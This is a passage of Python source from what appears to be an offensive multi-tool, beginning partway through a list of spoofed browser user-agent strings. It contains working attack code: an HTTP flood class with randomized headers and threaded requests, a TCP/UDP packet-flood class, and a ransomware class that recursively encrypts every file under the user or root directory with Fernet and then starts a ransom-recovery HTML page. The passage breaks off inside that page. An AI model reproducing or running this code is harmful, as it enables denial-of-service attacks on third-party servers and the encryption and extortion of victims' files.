               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
               'Links (2.1pre15; FreeBSD 5.4-STABLE i386; 158x58)', 'Wget/1.8.2',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0', 'Mediapartners-Google/2.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.5) Gecko/20031007 Firebird/0.7',
               'Mozilla/4.04 [en] (WinNT; I)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20060205 Galeon/2.0.0 (Debian package 2.0.0-2)',
               'lwp-trivial/1.41', 'NetBSD-ftp/20031210', 'Dillo/0.8.5-i18n-misc',
               'Links (2.1pre20; NetBSD 2.1_STABLE i386; 145x54)',
               'Lynx/2.8.5rel.5 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d',
               'Lynx/2.8.5rel.3 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d',
               'Links (2.1pre19; NetBSD 2.1_STABLE sparc64; 145x54)',
               'Lynx/2.8.6dev.15 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d',
               'Links (2.1pre14; IRIX64 6.5 IP27; 145x54)', 'Wget/1.10.1',
               'ELinks/0.10.5 (textmode; FreeBSD 4.11-STABLE i386; 80x22-2)',
               'Links (2.1pre20; FreeBSD 4.11-STABLE i386; 80x22)',
               'Lynx/2.8.5rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d-p1', 'Opera/8.52 (X11; Linux i386; U; de)',
               'Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.0.1) Gecko/20060310 Firefox/1.5.0.1',
               'Mozilla/5.0 (X11; U; IRIX64 IP27; en-US; rv:1.4) Gecko/20030711',
               'Mozilla/4.8 [en] (X11; U; IRIX64 6.5 IP27)', 'Mozilla/4.76 [en] (X11; U; SunOS 5.8 sun4m)',
               'Opera/5.0 (SunOS 5.8 sun4m; U) [en]', 'Links (2.1pre15; SunOS 5.8 sun4m; 80x24)',
               'Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d', 'Wget/1.8.1', 'Wget/1.9.1',
               'tnftp/20050625', 'Links (1.00pre12; Linux 2.6.14.2.20051115 i686; 80x24) (Debian pkg 0.99+1.00pre12-1)',
               'Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/1.0.16',
               'Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.7) Gecko/20051122', 'Wget/1.7',
               'Lynx/2.8.2rel.1 libwww-FM/2.14', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; de) Opera 8.53',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7e',
               'Links (2.1pre20; SunOS 5.10 sun4u; 80x22)',
               'Lynx/2.8.5rel.5 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i',
               'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.8) Gecko/20060202 Firefox/1.5',
               'Opera/8.51 (X11; Linux i386; U; de)', 'Emacs-W3/4.0pre.46 URL/p4.0pre.46 (i386--freebsd; X11)',
               'Links (0.96; OpenBSD 3.0 sparc)', 'Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.6c',
               'Lynx/2.8.3rel.1 libwww-FM/2.14',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)', 'libwww-perl/5.79',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.53',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.12) Gecko/20050919 Firefox/1.0.7',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)',
               'msnbot/1.0 (+http://search.msn.com/msnbot.htm)', 'Googlebot/2.1 (+http://www.google.com/bot.html)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051008 Firefox/1.0.7',
               'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.51',
               'Mozilla/5.0 (compatible; Konqueror/3.4; Linux) KHTML/3.4.3 (like Gecko)',
               'Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7c',
               'Mozilla/4.0 (compatible; MSIE 6.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/4.8 [en] (Windows NT 5.1; U)', 'Opera/8.51 (Windows NT 5.1; U; en)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Opera/8.51 (Windows NT 5.1; U; en;VWP-online.de)',
               'sproose/0.1-alpha (sproose crawler; http://www.sproose.com/bot.html; crawler@sproose.com)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0,gzip(gfe) (via translate.google.com)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'BrowserEmulator/0.9 see http://dejavu.org',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:0.9.4.1) Gecko/20020508',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.2 (KHTML, like Gecko)',
               'Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.4) Gecko/20030624',
               'iCCrawler (http://www.iccenter.net/bot.htm)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.6) Gecko/20050321 Firefox/1.0.2',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Maxthon; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.7.12) Gecko/20051013 Debian/1.7.12-1ubuntu1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de; rv:1.8) Gecko/20051111 Firefox/1.5',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:0.9.4.1) Gecko/20020508 Netscape6/6.2.3',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.50',
               'Mozilla/3.0 (x86 [de] Windows NT 5.0; Sun)', 'Java/1.4.1_04',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8) Gecko/20051111 Firefox/1.5',
               'msnbot/0.9 (+http://search.msn.com/msnbot.htm)',
               'NutchCVS/0.8-dev (Nutch running at UW; http://www.nutch.org/docs/en/bot.html; sycrawl@cs.washington.edu)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.53',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.4) Gecko/20030619 Netscape/7.1 (ax)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.6',
               'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0)', 'Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)',
               'Mozilla/4.0 (compatible; MSIE 5.01; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 5.0; Windows 95)',
               'Mozilla/4.0 (compatible; MSIE 5.5; AOL 7.0; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)',
               'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)',
               'Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)', 'Opera/8.53 (Windows NT 5.1; U; en)',
               'Opera/8.01 (Windows NT 5.0; U; de)', 'Opera/8.54 (Windows NT 5.1; U; de)',
               'Opera/8.53 (Windows NT 5.0; U; en)', 'Opera/8.01 (Windows NT 5.1; U; de)',
               'Opera/8.50 (Windows NT 5.1; U; de)',
               'Mozilla/4.0 (compatible- MSIE 6.0- Windows NT 5.1- SV1- .NET CLR 1.1.4322',
               'Mozilla/4.0(compatible; MSIE 5.0; Windows 98; DigExt)',
               'Mozilla/4.0 (compatible; Cerberian Drtrs Version-3.2-Build-0)',
               'Mozilla/4.0 (compatible; AvantGo 6.0; FreeBSD)', 'Mozilla/4.5 [de] (Macintosh; I; PPC)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; .NET CLR 1.1.4322; MSN 9.0;MSN 9.1; MSNbMSNI; MSNmen-us; MSNcIA; MPLUS)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {59FC8AE0-2D88-C929-DA8D-B559D01826E7}; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; snprtz|S04741035500914#914|isdn; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; EnergyPlugIn; dial)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; iebar; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461; sbcydsl 3.12; YComp 5.0.0.0; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.1.02b)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Arcor 5.004; .NET CLR 1.0.3705)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; YComp 5.0.0.0; SV1; .NET CLR 1.0.3705)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Ringo; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; YPC 3.0.1; .NET CLR 1.1.4322; yplus 4.1.00b)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; YPC 3.2.0)',
               'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; BUILDWARE 1.6; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; HbTools 4.7.5)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; YPC 3.2.0; (R1 1.5)',
               'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; it)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FunWebProducts; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Arcor 5.004; FunWebProducts; HbTools 4.7.5)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; en)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Tablet PC 1.7)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312469)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Maxthon; SV1; FDM)',
               'Mozilla/5.0 (Macintosh; U; PPC; de-DE; rv:1.0.2)', 'Mozilla/5.0 (Windows; U; Win98; de-DE; rv:1.7.12)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1)',
               'Mozilla/5.0 (compatible; Konqueror/3.4; Linux 2.6.14-kanotix-9; X11)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.10)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.12)',
               'Mozilla/5.0 (Windows; U; Win98; de; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.0.1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; de; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.2)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.7)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6)',
               'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.8)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.7.10)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.8.0.1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8)',
               'Mozilla/5.0 (Windows; U; Win 9x 4.90; de; rv:1.8.0.1)',
               'Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.7.12)', 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.8)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; fi; rv:1.8.0.1)',
               'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.4.1)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR; rv:1.7.12)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; zh-TW; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.7.3)',
               'Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:1.7.12)',
               'Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.7.12)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; sl; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.0.1)', 'Mozilla/5.0 (X11; Linux i686; rv:1.7.5)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.6)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.2)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.6)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.7.6)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8a3)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.10)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.7.12)',
               'Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:1.7.5)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.8.0.1)',
               'Mozilla/5.0 (compatible; Konqueror/3; Linux)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.8)',
               'Mozilla/5.0 (compatible; Konqueror/3.2; Linux)', 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; tg)',
               'Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.8b4)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51']
        return user_agents
    def stop_atk(self):
        self.stopatk = True
    def build_querystr(self, value):
        result = ''
        for i in range(value):
            item = random.randint(65, 100)
            result += chr(item)
        return result
    def ddos(self):
        code = 0
        if not self.stopatk:
            try:
                agent = random.choice(self.useragents)
                req = urllib.request.Request(self.ip, headers={'User-Agent': agent,
                                                               'Referer': random.choice(
                                                                   self.referers) + self.build_querystr(
                                                                   random.randint(50, 100)),
                                                               'Cache-Control': 'no-cache',
                                                               'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
                                                               'Keep-Alive': random.randint(110, 160),
                                                               'Connection': 'keep-alive'})
                urllib.request.urlopen(req)
                code = 200
            except urllib.error.HTTPError as e:
                code_split = str(e).split()
                code = code_split[2]
                code = str(code[0] + code[1] + code[2])
                if "500" in str(e):
                    code = 500
                elif "429" in str(e):
                    code = 500
                elif code.startswith('5'):
                    code = 500
            except urllib.error.URLError as e:
                if "A connection attempt failed" in str(e):
                    code = 500
            except:
                pass
        return code
    def start_thr(self):
        while True:
            try:
                x = threading.Thread(target=self.ddos)
                x.start()
                time.sleep(self.delay)
                if self.stopatk:
                    break
            except:
                pass
    def ddos_start(self):
        while True:
            try:
                http_code = self.ddos()
                if http_code == 500:
                    break
                if self.stopatk:
                    break
            except:
                pass
class TCP_UDP_Flood:
    def __init__(self, ip, port, delay, pkt_size, thr_count):
        self.ip = ip
        self.port = int(port)
        self.delay = float(delay)
        self.pkt_size = int(pkt_size)
        self.thread_count = thr_count
        self.havingskillissues = False
        self.stop = False
    def gen_packet(self, size):
        return random._urandom(size)
    def UDP_Req(self):
        while not self.stop:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(self.gen_packet(self.pkt_size), (self.ip, self.port))
                s.close()
                if self.havingskillissues:
                    self.havingskillissues = False
                time.sleep(self.delay)
            except KeyboardInterrupt:
                self.stop = True
            except Exception as e:
                if "too big" in str(e).lower():
                    self.pkt_size -= 1
                    if not self.havingskillissues:
                        self.havingskillissues = True
    def TCP_req(self):
        while not self.stop:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.ip, self.port))
                s.send(self.gen_packet(self.pkt_size))
                s.close()
                if self.havingskillissues:
                    self.havingskillissues = False
                time.sleep(self.delay)
            except KeyboardInterrupt:
                self.stop = True
            except Exception as e:
                if "too big" in str(e).lower():
                    self.pkt_size -= 1
                    if not self.havingskillissues:
                        self.havingskillissues = True
    def Stop_Atk(self):
        self.stop = True
    def TCP_Flood(self):
        for i in range(self.thread_count):
            try:
                tcp_req = threading.Thread(target=self.TCP_req)
                tcp_req.start()
            except KeyboardInterrupt:
                self.stop = True
            except:
                pass
    def UDP_Flood(self):
        for i in range(self.thread_count):
            try:
                udp_req = threading.Thread(target=self.UDP_Req)
                udp_req.start()
            except KeyboardInterrupt:
                self.stop = True
            except:
                pass
class RansomWare:
    def __init__(self, key):
        self.key = key
        self.fernet = Fernet(self.key)
        self.dirlist = []
        self.filelist = []
        self.keyfile = "key.txt"
        self.recovery_directory = ""
        if sys.platform == "win32":
            os.chdir("C:/Users/")
            self.recovery_directory = f"C:/Users/{os.getlogin()}/"
        else:
            self.recovery_directory = "/"
            os.chdir("/")
    def get_dir_list(self):
        for i in os.listdir():
            try:
                file = open(i, "rb")
                file.close()
                self.filelist.append(os.path.join(os.getcwd(),i))
            except:
                self.dirlist.append(os.path.join(os.getcwd(), i))
    def encrypt_file(self, file):
        try:
            with open(file, "rb") as og_file:
                content = self.fernet.encrypt(og_file.read())
                og_file.close()
            with open(file, "wb") as enc_file:
                enc_file.write(content)
                enc_file.close()
        except:
            pass
    def encrypt(self):
        self.get_dir_list()
        for i in self.dirlist:
            try:
                os.chdir(i)
                self.get_dir_list()
            except:
                pass
        for i in self.filelist:
            file_thread = threading.Thread(target=self.encrypt_file, args=(i,))
            file_thread.start()
        self.ransom()
        self.checker = threading.Thread(target=self.check_key_file)
        self.checker.start()
    def decrypt(self):
        for i in self.filelist:
            try:
                with open(i,"rb") as enc_file:
                    content = self.fernet.decrypt(enc_file.read())
                    enc_file.close()
                with open(i,"wb") as new_file:
                    new_file.write(content)
                    new_file.close()
            except:
                pass
    def download_emotional_support(self):
        cmd = subprocess.Popen(f"cd {self.recovery_directory}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        _cmd = subprocess.Popen(f"curl -o barbara.png https://i.redd.it/w2eduogz9ir51.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    def recovering_html_code(self):
        return '''
<!DOCTYPE html>
<head>
<style>
    #roundedCorners { 
        border-radius: 25px; 
        border-spacing: 0;
    }
    #roundedCorners td, 
    #roundedCorners th { 
        border-bottom: 1px solid rgb(0, 0, 0);
        padding: 10px; 
    }
    #roundedCorners tr:last-child > td {
        border-bottom: none;
    }
</style>'''+f'''
</head>
<title>Yay! | You've entered the correct encryption key!</title>
<body bgcolor='skyblue'>
    <div style="font-family: sans-serif; text-align: center;">
<h1 style="text-align: center;">You entered the correct encryption key!</h1>
<table style="margin-left: auto; margin-right: auto; background-color: rgb(96, 99, 255);" id="roundedCorners">
    <tr>
        <td><h1>Lucky you!</h1></td>
    </tr>
    <tr>
        <td>
            <h3>Soon you will have your files back!</h3>
        </td>
    </tr>
    <tr>
        <td>
